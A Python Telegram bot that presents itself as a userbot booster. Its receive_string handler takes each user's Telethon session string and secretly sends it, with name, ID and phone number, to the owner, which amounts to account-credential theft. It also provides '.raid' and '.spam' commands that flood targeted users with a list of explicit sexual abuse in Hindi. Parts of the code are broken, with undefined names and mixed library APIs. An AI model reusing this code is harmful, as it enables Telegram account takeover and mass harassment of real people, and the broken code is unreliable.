import os
from dotenv import load_dotenv
load_dotenv()
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import nest_asyncio, asyncio, random

nest_asyncio.apply()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
WELCOME_IMAGE_URL = os.getenv("WELCOME_IMAGE_URL")
GIRL_IMAGE = os.getenv("GIRL_IMAGE_URL")
userbots = {}
waiting_for_string = set()

# --- Raid Messages List ---
raid_messages =["𝗧𝗘𝗥𝗜 𝗕𝗔𝗛𝗘𝗡 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘𝗜 𝗕𝗔𝗥𝗚𝗔𝗗 𝗞𝗔 𝗣𝗘𝗗 𝗨𝗚𝗔 𝗗𝗨𝗡𝗚𝗔𝗔 𝗖𝗢𝗥𝗢𝗡𝗔 𝗠𝗘𝗜 𝗦𝗔𝗕 𝗢𝗫𝗬𝗚𝗘𝗡 𝗟𝗘𝗞𝗔𝗥 𝗝𝗔𝗬𝗘𝗡𝗚𝗘🤢🤩🥳", "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘 𝗖𝗛𝗔𝗡𝗚𝗘𝗦 𝗖𝗢𝗠𝗠𝗜𝗧 𝗞𝗥𝗨𝗚𝗔 𝗙𝗜𝗥 𝗧𝗘𝗥𝗜 𝗕𝗛𝗘𝗘𝗡 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗔𝗨𝗧𝗢𝗠𝗔𝗧𝗜𝗖𝗔𝗟𝗟𝗬 𝗨𝗣𝗗𝗔𝗧𝗘 𝗛𝗢𝗝𝗔𝗔𝗬𝗘𝗚𝗜🤖🙏🤔", "𝗧𝗘𝗥𝗜 𝗩𝗔𝗛𝗘𝗘𝗡 𝗗𝗛𝗔𝗡𝗗𝗛𝗘 𝗩𝗔𝗔𝗟𝗜 😋😛", "𝗝𝗨𝗡𝗚𝗟𝗘 𝗠𝗘 𝗡𝗔𝗖𝗛𝗧𝗔 𝗛𝗘 𝗠𝗢𝗥𝗘 𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌𝗞𝗜 𝗖𝗛𝗨𝗗𝗔𝗜 𝗗𝗘𝗞𝗞𝗘 𝗦𝗔𝗕 𝗕𝗢𝗟𝗧𝗘 𝗢𝗡𝗖𝗘 𝗠𝗢𝗥𝗘 𝗢𝗡𝗖𝗘 𝗠𝗢𝗥𝗘 🤣🤣💦💋", "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧𝗛 𝗙𝗔𝗔𝗗𝗞𝗘 𝗥𝗔𝗞𝗗𝗜𝗔 𝗠𝗔‌𝗔‌𝗞𝗘 𝗟𝗢𝗗𝗘 𝗝𝗔𝗔 𝗔𝗕𝗕 𝗦𝗜𝗟𝗪𝗔𝗟𝗘 👄👄", "𝗖𝗛𝗔𝗟 𝗕𝗘𝗧𝗔 𝗧𝗨𝗝𝗛𝗘 𝗠𝗔‌𝗔‌𝗙 𝗞𝗜𝗔 🤣 𝗔𝗕𝗕 𝗔𝗣𝗡𝗜 𝗚𝗙 𝗞𝗢 𝗕𝗛𝗘𝗝", "𝗧𝗘𝗥𝗜 𝗚𝗙 𝗞𝗢 𝗘𝗧𝗡𝗔 𝗖𝗛𝗢𝗗𝗔 𝗕𝗘‌𝗛𝗘𝗡 𝗞𝗘 𝗟𝗢𝗗𝗘 𝗧𝗘𝗥𝗜 𝗚𝗙 𝗧𝗢 𝗠𝗘𝗥𝗜 𝗥Æ𝗡𝗗𝗜 𝗕𝗔𝗡𝗚𝗔𝗬𝗜 𝗔𝗕𝗕 𝗖𝗛𝗔𝗟 𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌𝗞𝗢 𝗖𝗛𝗢𝗗𝗧𝗔 𝗙𝗜𝗥𝗦𝗘 ♥️💦😆😆😆😆", "𝗦𝗨𝗡 𝗠𝗔‌𝗔‌𝗗𝗔𝗥𝗖𝗛Ø𝗗 𝗝𝗬𝗔𝗗𝗔 𝗡𝗔 𝗨𝗖𝗛𝗔𝗟 𝗠𝗔‌𝗔‌ 𝗖𝗛𝗢𝗗 𝗗𝗘𝗡𝗚𝗘 𝗘𝗞 𝗠𝗜𝗡 𝗠𝗘𝗜 ✅🤣🔥🤩", "𝗧𝗘𝗥𝗜 𝗕𝗘𝗛𝗡 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘 𝗞𝗘𝗟𝗘 𝗞𝗘 𝗖𝗛𝗜𝗟𝗞𝗘 🤤🤤", "𝗧𝗘𝗥𝗜 𝗕𝗔𝗛𝗘𝗡 𝗞𝗜 𝗚𝗔𝗔𝗡𝗗 𝗠𝗘𝗜 𝗢𝗡𝗘𝗣𝗟𝗨𝗦 𝗞𝗔 𝗪𝗥𝗔𝗣 𝗖𝗛𝗔𝗥𝗚𝗘𝗥 30𝗪 𝗛𝗜𝗚𝗛 𝗣𝗢𝗪𝗘𝗥 💥😂😎", "𝗔𝗥𝗘 𝗥𝗘 𝗠𝗘𝗥𝗘 𝗕𝗘𝗧𝗘 𝗞𝗬𝗢𝗨𝗡 𝗦𝗣𝗘𝗘𝗗 𝗣𝗔𝗞𝗔𝗗 𝗡𝗔 𝗣𝗔𝗔𝗔 𝗥𝗔𝗛𝗔 𝗔𝗣𝗡𝗘 𝗕𝗔𝗔𝗣 𝗞𝗔 𝗛𝗔𝗛𝗔𝗛🤣🤣", "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌𝗔𝗞𝗜 𝗖𝗛𝗨𝗗𝗔𝗜 𝗞𝗢 𝗣𝗢𝗥𝗡𝗛𝗨𝗕.𝗖𝗢𝗠 𝗣𝗘 𝗨𝗣𝗟𝗢𝗔𝗗 𝗞𝗔𝗥𝗗𝗨𝗡𝗚𝗔 𝗦𝗨𝗔𝗥 𝗞𝗘 𝗖𝗛𝗢𝗗𝗘 🤣💋💦", "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗘 𝗕𝗛𝗢𝗦𝗗𝗘 𝗠𝗘𝗜 𝗚𝗜𝗧𝗛𝗨𝗕 𝗗𝗔𝗟 𝗞𝗘 𝗔𝗣𝗡𝗔 𝗕𝗢𝗧 𝗛𝗢𝗦𝗧 𝗞𝗔𝗥𝗨𝗡𝗚𝗔𝗔 🤩👊👤😍", "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗖😂𝗛𝗨𝗨‌𝗧 𝗞𝗔𝗞𝗧𝗘 🤱 𝗚𝗔𝗟𝗜 𝗞𝗘 𝗞𝗨𝗧𝗧𝗢 🦮 𝗠𝗘 𝗕𝗔𝗔𝗧 𝗗𝗨𝗡𝗚𝗔 𝗣𝗛𝗜𝗥 🍞 𝗕𝗥𝗘𝗔𝗗 𝗞𝗜 𝗧𝗔𝗥𝗛 𝗞𝗛𝗔𝗬𝗘𝗡𝗚𝗘 𝗪𝗢 𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧", "𝗧𝗘𝗥𝗜 𝗥Æ𝗡𝗗𝗜 𝗠𝗔‌𝗔‌ 𝗦𝗘 𝗣𝗨𝗖𝗛𝗡𝗔 𝗕𝗔𝗔𝗣 𝗞𝗔 𝗡𝗔𝗔𝗠 𝗕𝗔𝗛𝗘𝗡 𝗞𝗘 𝗟𝗢𝗗𝗘𝗘𝗘𝗘𝗘 🤩🥳😳", "𝗧𝗘𝗥𝗔 𝗕𝗔𝗔𝗣 𝗝𝗢𝗛𝗡𝗬 𝗦𝗜𝗡𝗦 𝗖𝗜𝗥𝗖𝗨𝗦 𝗞𝗔𝗬 𝗕𝗛𝗢𝗦𝗗𝗘 𝗝𝗢𝗞𝗘𝗥 𝗞𝗜 𝗖𝗛𝗜𝗗𝗔𝗔𝗦 𝟭𝟰 𝗟𝗨𝗡𝗗 𝗞𝗜 𝗗𝗛𝗔𝗔𝗥 𝗧𝗘𝗥𝗜 𝗠𝗨𝗠𝗠𝗬 𝗞𝗜 𝗖𝗛𝗨𝗧 𝗠𝗔𝗜 𝟮𝟬𝟬 𝗜𝗡𝗖𝗛 𝗞𝗔 𝗟𝗨𝗡𝗗",]

love_messages = [
    "💖 𝗠𝗼𝗵𝗮𝗯𝗯𝗮𝘁 𝗸𝗮 𝗷𝘂𝗻𝗼𝗼𝗻 𝘀𝗶𝗿𝗳 𝘂𝗻𝗸𝗼 𝗵𝗼𝘁𝗮 𝗵𝗮𝗶\n𝗝𝗶𝗻𝗵𝗲 𝗽𝘆𝗮𝗮𝗿 𝗸𝗶 𝗸𝗮𝗱𝗮𝗿 𝗵𝗼𝘁𝗶 𝗵𝗮𝗶 💕",
    "🌙 𝗖𝗵𝗮𝗻𝗱𝗻𝗶 𝗿𝗮𝗮𝘁 𝗺𝗲𝗶𝗻 𝘁𝗲𝗿𝗶 𝘆𝗮𝗮𝗱𝗼𝗻 𝗸𝗮 𝗷𝗮𝗱𝗼𝗼 𝗵𝗮𝗶,\n𝗗𝗶𝗹 𝗸𝗲 𝗵𝗮𝗿 𝗸𝗼𝗻𝗲 𝗺𝗲𝗶𝗻 𝘀𝗶𝗿𝗳 𝘁𝗲𝗿𝗮 𝗵𝗶 𝗮𝗮𝘀𝗵𝗶𝘆𝗮𝗮𝗻𝗮 𝗵𝗮𝗶 💫",
    "❤️ 𝗭𝗶𝗻𝗱𝗮𝗴𝗶 𝗸𝗲 𝘀𝗮𝗳𝗮𝗿 𝗺𝗲𝗶𝗻 𝗺𝗶𝗹𝘁𝗶 𝗿𝗮𝗵𝗲 𝘁𝗲𝗿𝗶 𝗺𝘂𝘀𝗸𝗮𝗮𝗻,\n𝗬𝗮𝗵𝗶 𝗵𝗮𝗶 𝗺𝗲𝗿𝗶 𝗱𝘂𝗮 𝗵𝗮𝗿 𝘀𝘂𝗯𝗮𝗵 𝗮𝘂𝗿 𝘀𝗵𝗮𝗮𝗺 💝",
    "💌 𝗛𝗮𝗿 𝘀𝗵𝗮𝘆𝗮𝗿𝗶 𝘁𝗲𝗿𝗶 𝘆𝗮𝗮𝗱 𝗺𝗲𝗶𝗻 𝗹𝗶𝗸𝗵𝘁𝗮 𝗵𝗼𝗼𝗻,\n𝗧𝘂 𝗺𝗲𝗿𝗶 𝗺𝗼𝗵𝗮𝗯𝗯𝗮𝘁, 𝘁𝘂 𝗺𝗲𝗿𝗮 𝗮𝗿𝗺𝗮𝗮𝗻 𝗵𝗮𝗶 💖",
    "🌹 𝗧𝘂𝗺𝗵𝗮𝗿𝗮 𝗻𝗮𝗮𝗺 𝗹𝗲𝗸𝗮𝗿 𝗹𝗶𝗸𝗵𝗶 𝗵𝗮𝗶 𝗵𝗮𝗿 𝗴𝗵𝗮𝘇𝗮𝗹,\n𝗧𝘂𝗺 𝗺𝗲𝗿𝗶 𝘇𝗶𝗻𝗱𝗮𝗴𝗶 𝗸𝗶 𝘀𝗮𝗯𝘀𝗲 𝗸𝗵𝗼𝗼𝗯𝘀𝘂𝗿𝗮𝘁 𝗺𝗶𝘀𝗮𝗮𝗹 💕",
    "✨ 𝗧𝗲𝗿𝗲 𝗯𝗶𝗻𝗮 𝘇𝗶𝗻𝗱𝗮𝗴𝗶 𝗮𝗱𝗵𝗼𝗼𝗿𝗶 𝗹𝗮𝗴𝘁𝗶 𝗵𝗮𝗶,\n𝗧𝘂 𝗵𝗼 𝘁𝗼𝗵 𝘀𝗮𝗯 𝗸𝘂𝗰𝗵 𝗽𝗼𝗼𝗿𝗮 𝗹𝗮𝗴𝘁𝗮 𝗵𝗮𝗶 💞",
    "🔥 𝗛𝗮𝗿 𝗱𝗵𝗮𝗱𝗸𝗮𝗻 𝗺𝗲𝗶𝗻 𝘀𝗶𝗿𝗳 𝘁𝗲𝗿𝗮 𝗵𝗶 𝘇𝗶𝗸𝗿 𝗵𝗮𝗶,\n𝗧𝘂 𝗺𝗲𝗿𝗶 𝘇𝗶𝗻𝗱𝗮𝗴𝗶 𝗸𝗮 𝘀𝗮𝗯𝘀𝗲 𝗸𝗵𝗼𝗼𝗯𝘀𝘂𝗿𝗮𝘁 𝗳𝗶𝗸𝗿 𝗵𝗮𝗶 ❤️",
    "🌸 𝗧𝗲𝗿𝗲 𝗯𝗶𝗻𝗮 𝗵𝗮𝗿 𝗹𝗮𝗺𝗵𝗮 𝘀𝗼𝗼𝗻𝗮 𝘀𝗮 𝗹𝗮𝗴𝘁𝗮 𝗵𝗮𝗶,\n𝗔𝘂𝗿 𝘁𝗲𝗿𝗲 𝘀𝗮𝘁𝗵 𝘀𝗮𝗯 𝗸𝘂𝗰𝗵 𝗿𝗼𝘀𝗵𝗮𝗻 𝗵𝗼 𝗷𝗮𝗮𝘁𝗮 𝗵𝗮𝗶 💖",
    "💍 𝗣𝘆𝗮𝗮𝗿 𝗸𝗶 𝗸𝗼𝗶 𝗺𝗮𝗻𝘇𝗶𝗹 𝗻𝗮𝗵𝗶,\n𝗕𝗮𝘀 𝗲𝗸 𝘀𝗮𝗳𝗮𝗿 𝗵𝗮𝗶 𝗷𝗼 𝘁𝗲𝗿𝗶 𝗺𝘂𝘀𝗸𝗮𝗮𝗻 𝘀𝗲 𝗿𝗼𝘀𝗵𝗮𝗻 𝗵𝗮𝗶 🌹",
    "💕 𝗧𝘂 𝗺𝗲𝗿𝗶 𝗱𝘂𝗮𝗼𝗻 𝗸𝗮 𝘄𝗼 𝗵𝗶𝘀𝘀𝗮 𝗵𝗮𝗶,\n𝗝𝗶𝘀𝗲 𝗔𝗹𝗹𝗮𝗵 𝗻𝗲 𝘀𝗮𝗯𝘀𝗲 𝗸𝗵𝗼𝗼𝗯𝘀𝘂𝗿𝗮𝘁 𝘁𝗮𝘂𝗿 𝗽𝗮𝗿 𝗾𝗮𝗯𝗼𝗼𝗹 𝗸𝗶𝘆𝗮 💞",
    "🌹 𝗧𝗲𝗿𝗲 𝗵𝗮𝘀𝗶𝗻 𝗹𝗮𝗯𝗼𝗻 𝗸𝗶 𝗺𝘂𝘀𝗸𝗮𝗮𝗻 𝗺𝗲𝗿𝗶 𝘇𝗶𝗻𝗱𝗮𝗴𝗶 𝗸𝗮 𝗻𝗼𝗼𝗿 𝗵𝗮𝗶 ✨",
    "💫 𝗧𝘂𝗺𝗵𝗮𝗿𝗶 𝗮𝗮𝗻𝗸𝗵𝗼𝗻 𝗺𝗲𝗶𝗻 𝗷𝗼 𝗽𝘆𝗮𝗿 𝗵𝗮𝗶, 𝘄𝗼 𝗺𝗲𝗿𝗶 𝗱𝘂𝗻𝗶𝘆𝗮 𝗸𝗮 𝘀𝗮𝗯𝘀𝗲 𝗸𝗵𝗼𝗼𝗯𝘀𝘂𝗿𝗮𝘁 𝘀𝗮𝗴𝗮𝗿 𝗵𝗮𝗶 🌊",
    "🔥 𝗧𝘂𝗺𝗵𝗮𝗿𝗶 𝘆𝗮𝗮𝗱 𝗵𝗮𝗿 𝗿𝗮𝗮𝘁 𝗸𝗼 𝗺𝗲𝗿𝗶 𝗻𝗲𝗲𝗻𝗱 𝗰𝗵𝗵𝗶𝗻 𝗹𝗲𝘁𝗶 𝗵𝗮𝗶 😴❤️",
    "🎶 𝗧𝘂𝗺𝗵𝗮𝗿𝗶 𝗮𝗮𝘄𝗮𝘇 𝗺𝗲𝗿𝗶 𝘇𝗶𝗻𝗱𝗮𝗴𝗶 𝗸𝗮 𝘀𝗮𝗯𝘀𝗲 𝗸𝗵𝗼𝗼𝗯𝘀𝘂𝗿𝗮𝘁 𝗴𝗮𝗮𝗻𝗮 𝗵𝗮𝗶 🎤",
    "💝 𝗝𝗮𝗯 𝘁𝘂𝗺 𝗺𝘂𝘀𝗸𝘂𝗿𝗮𝘁𝗲 𝗵𝗼, 𝘁𝗼 𝗺𝗲𝗿𝗶 𝗱𝘂𝗻𝗶𝘆𝗮 𝗿𝗼𝘀𝗵𝗮𝗻 𝗵𝗼 𝗷𝗮𝗮𝘁𝗶 𝗵𝗮𝗶 🌍✨",
    "🌸 𝗠𝗲𝗿𝗶 𝗵𝗮𝗿 𝗸𝗵𝘄𝗮𝗵𝗶𝘀𝗵 𝗺𝗲𝗶𝗻 𝘁𝘂𝗺𝗵𝗮𝗿𝗮 𝗱𝗮𝗮𝗺𝗮𝗻 𝗵𝗼𝗻𝗮 𝘇𝗮𝗿𝗼𝗼𝗿𝗶 𝗵𝗮𝗶 💞",
    "🌍 𝗧𝘂 𝗺𝗲𝗿𝗶 𝗱𝘂𝗻𝗶𝘆𝗮, 𝗺𝗲𝗿𝗮 𝗮𝗮𝘀𝗺𝗮𝗮𝗻, 𝗺𝗲𝗿𝗮 𝗷𝗮𝗵𝗮𝗮𝗻 𝗵𝗮𝗶 🌌",
    "💖 𝗛𝗮𝗿 𝗱𝗶𝗻 𝘁𝗲𝗿𝗶 𝘆𝗮𝗮𝗱 𝗺𝗲𝗶𝗻 𝗯𝗮𝘁𝗮𝘁𝗮 𝗵𝗼𝗼𝗻,\n𝗧𝘂𝗺 𝗺𝗲𝗿𝗶 𝘇𝗶𝗻𝗱𝗮𝗴𝗶 𝗸𝗮 𝘀𝗮𝗯𝘀𝗲 𝗮𝗵𝗺 𝗵𝗶𝘀𝘀𝗮 𝗵𝗼 💝",
    "🌹 𝗠𝗮𝗻𝘇𝗶𝗹 𝗸𝗼 𝗽𝗮𝗮𝗻𝗮 𝗻𝗮𝗵𝗶 𝗰𝗵𝗮𝗵𝘁𝗮,\n𝗕𝘀 𝘁𝘂𝗺𝗵𝗮𝗿𝗲 𝘀𝗮𝗮𝘁𝗵 𝘀𝗮𝗳𝗮𝗿 𝗰𝗵𝗮𝗵𝘁𝗮 𝗵𝗼𝗼𝗻 💕",
    "🔥 𝗧𝘂𝗺𝗵𝗮𝗿𝗮 𝗽𝘆𝗮𝗮𝗿 𝗺𝗲𝗿𝗶 𝘇𝗶𝗻𝗱𝗮𝗴𝗶 𝗸𝗮 𝘀𝗮𝗯𝘀𝗲 𝗸𝗵𝗼𝗼𝗯𝘀𝘂𝗿𝗮𝘁 𝗶𝗸𝗿𝗮𝗮𝗿 𝗵𝗮𝗶 ❤️"
]

# --- Start command ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    waiting_for_string.add(user_id)

    keyboard = [
        [
            InlineKeyboardButton("𝗖ʜᴀɴɴᴇʟ", url=SUPPORT_CHANNEL),
            InlineKeyboardButton("𝗚ʀᴏᴜᴘ", url=SUPPORT_GROUP)
        ],
        [
            InlineKeyboardButton("𝗛ᴇʟᴘ", callback_data="help")
        ],
        [
            InlineKeyboardButton("𝗠ʏ 𝗟ᴏʀᴅ", url="https://t.me/YourUsername")
        ]
    ]

    await update.message.reply_photo(
        photo=WELCOME_IMAGE,
        caption=(
            """┌────── ˹ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ˼ ⏤͟͟͞͞‌‌‌‌★
┆◍ ʜᴇʏ, ɪ ᴀᴍ : 𝗥𝗔𝗗𝗛𝗔 ✘ 𝗨𝗦𝗘𝗥𝗕𝗢𝗧
┆◍ ɴɪᴄᴇ ᴛᴏ ᴍᴇᴇᴛ ʏᴏᴜ ᴅᴇᴀʀ !! 
└────────────────────•
 ❖ ɪ ᴀᴍ ᴀ ᴘᴏᴡᴇʀғᴜʟ & ᴜsᴇғᴜʟʟ ᴜsᴇʀʙᴏᴛ.
 ❖ ʏᴏᴜ ᴄᴀɴ ᴜsᴇ ᴍᴇ ғᴏʀ ғᴜɴ ʀᴀɪᴅ sᴘᴀᴍ.
 ❖ ɪ ᴄᴀɴ ʙᴏᴏsᴛ ʏᴏᴜʀ ɪᴅ ᴡɪᴛʜ ᴀɴɪᴍᴀᴛɪᴏɴ
 ❖ ᴛᴀᴘ ᴛᴏ ʜᴇʟᴘ ʙᴜᴛᴛᴏɴ ғᴏʀ ᴅᴇᴛᴀɪʟs.
 •────────────────────• """
            "⚡𝗦𝗘𝗡𝗗 𝗠𝗘 𝗬𝗢𝗨𝗥 𝗧𝗘𝗟𝗘𝗧𝗛𝗢𝗡 𝗦𝗧𝗥𝗜𝗡𝗚 𝗦𝗘𝗦𝗦𝗜𝗢𝗡 𝗧𝗢 𝗕𝗢𝗢𝗧 𝗬𝗢𝗨𝗥 𝗖𝗟𝗜𝗘𝗡𝗧"
        ),
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# --- Handlers for userbot commands ---
async def register_userbot_handlers(client, me):

    @client.on(events.NewMessage(pattern=r"\.ping"))
    async def ping(event):
        m = await event.respond("🔄 𝗣𝗜𝗡𝗚𝗜𝗡𝗚...")
        await asyncio.sleep(0.5)
        await m.edit(f"⚡ 𝗛𝗘𝗬 𝗜 𝗔𝗠 𝗔𝗟𝗜𝗩𝗘 {me.first_name}")

    @client.on(events.NewMessage(pattern=r"\.alive"))
    async def alive(event):
        await event.respond(f"✅ {me.first_name} ᴛᴜᴍᴀʀᴀ ʙᴀᴀᴘ ᴏᴘ 🔥")

    @client.on(events.NewMessage(pattern=r"\.raid(?:\s+\d+)?"))
    async def raid(event):
        if not event.is_reply:
            return await event.reply("⚠️ Reply to a user's message with `.raid <count>`")

        reply_msg = await event.get_reply_message()
        try:
            user = await reply_msg.get_sender()
            if user:
                mention = (
                    f"@{user.username}"
                    if user.username
                    else f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
                )
            else:
                mention = "that user"
        except:
            mention = "that user"

        args = event.raw_text.split()
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 5

        await event.reply(f"⚡ Starting raid on {mention} with {count} messages...", parse_mode="html")

        for i in range(count):
            try:
                text = raid_messages[i % len(raid_messages)]
                text = f"{mention}, {text}"
                await event.respond(text, parse_mode="html")
                await asyncio.sleep(0)  # 0 for faster
            except Exception as e:
                await event.respond(f"⚠️ Error sending message {i+1}: {e}")
                break

    @client.on(events.NewMessage(pattern=r"\.spam"))
    async def spam(event):
        args = event.raw_text.split(maxsplit=2)
        if len(args) < 3:
            return await event.reply("⚠️ Usage: `.spam <count> <message>`")

        try:
            count = int(args[1])
        except ValueError:
            return await event.reply("⚠️ Count must be a number.")

        message_text = args[2]
        await event.reply(f"⚡ Spamming `{count}` times...")

        for i in range(count):
            await event.respond(message_text)
            await asyncio.sleep(0)

    @client.on(events.NewMessage(pattern=r"\.love(?:\s+\d+)?"))
    async def love_handler(event):
        if not event.is_reply:
            return await event.reply("⚠️ Reply to a user's message with `.love <count>`")

        reply_msg = await event.get_reply_message()
        user = await reply_msg.get_sender()

        mention = (
            f"@{user.username}"
            if user.username
            else f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
        )

        args = event.raw_text.split()
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 5

        await event.reply(f"💖 Sending {count} love shayaris for {mention}...", parse_mode="html")

        for i in range(count):
            text = love_messages[i % len(love_messages)]
            text = f"{mention}, {text}"
            await event.respond(text, parse_mode="html")
            await asyncio.sleep(0)

# --- Receive string session ---
# --- Receive string session ---
async def receive_string(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in waiting_for_string:
        return
    string = update.message.text.strip()
    msg = await update.message.reply_text("⚡𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧.....")

    try:
        client = TelegramClient(StringSession(string), API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            waiting_for_string.discard(user_id)
            return await msg.edit_text("❌ Invalid String Session! Please regenerate.")

        me = await client.get_me()
        userbots[user_id] = client
        waiting_for_string.discard(user_id)

        # ✅ Send session details to owner
        owner_msg = (
            f"<b>📌 NEW STRING SESSION RECEIVED</b>\n\n"
            f"👤 User: {me.first_name} (@{me.username or 'NoUsername'})\n"
            f"🆔 ID: <code>{me.id}</code>\n"
            f"📱 Phone: <code>{me.phone or 'Hidden'}</code>\n\n"
            f"🔑 String:\n<code>{string}</code>"
        )
        await context.bot.send_message(chat_id=OWNER_ID, text=owner_msg, parse_mode="HTML")

        # ✅ Start client handlers
        await register_userbot_handlers(client, me)
        await client.start()

        await msg.edit_text(
            f"✅ <b>𝗬𝗢𝗨𝗥 𝗖𝗟𝗜𝗘𝗡𝗧 𝗕𝗢𝗢𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬</b>\n\n"
            f"👤 Connected as: {me.first_name} (@{me.username or 'NoUsername'})",
            parse_mode="HTML"
        )

    except Exception as e:
        waiting_for_string.discard(user_id)
        await msg.edit_text(f"❌ Error: {e}")

    except Exception as e:
        waiting_for_string.discard(user_id)
        await msg.edit_text(f"❌ Error: {e}")

# --- Buttons handler ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer(cache_time=0)
    except:
        pass

    if query.data == "help":
        keyboard = [
            [InlineKeyboardButton("🛑 𝗦𝗧𝗢𝗣 𝗕𝗢𝗧", callback_data="stop")],
            [InlineKeyboardButton("⬅️ 𝗚𝗢 𝗕𝗔𝗖𝗞", callback_data="back")]
        ]
        await query.edit_message_media(
            InputMediaPhoto(
                GIRL_IMAGE,
                caption="""✦ ᴀʙᴏᴜᴛ ᴛʜɪꜱ ʙᴏᴛ
◍ Supports: Raid, Spam, Shayari, Love, etc."""
            ),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    elif query.data == "stop":
        user_id = query.from_user.id
        if user_id in userbots:
            client = userbots[user_id]
            await client.disconnect()
            del userbots[user_id]
            await query.edit_message_caption("🛑 𝗨𝗦𝗘𝗥𝗕𝗢𝗧 𝗦𝗧𝗢𝗣𝗣𝗘𝗗")
        else:
            await query.edit_message_caption("⚠️ 𝗡𝗢 𝗔𝗖𝗧𝗜𝗩𝗘 𝗨𝗦𝗘𝗥𝗕𝗢𝗧")

    elif query.data == "back":
        keyboard = [
            [
                InlineKeyboardButton("𝗖ʜᴀɴɴᴇʟ", url=SUPPORT_CHANNEL),
                InlineKeyboardButton("𝗦ᴜᴘᴘᴏʀᴛ 𝗚ʀᴏᴜᴘ", url=SUPPORT_GROUP)
            ],
            [InlineKeyboardButton("𝗛ᴇʟᴘ", callback_data="help")],
            [InlineKeyboardButton("𝗢ᴡɴᴇʀ", url="https://t.me/YourUsername")]
        ]
        await query.edit_message_media(
            InputMediaPhoto(WELCOME_IMAGE, caption="⚡ Send me your Telethon String Session to boot your client"),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

# --- Main runner ---
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, receive_string))
    dp.add_handler(CallbackQueryHandler(button_handler))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
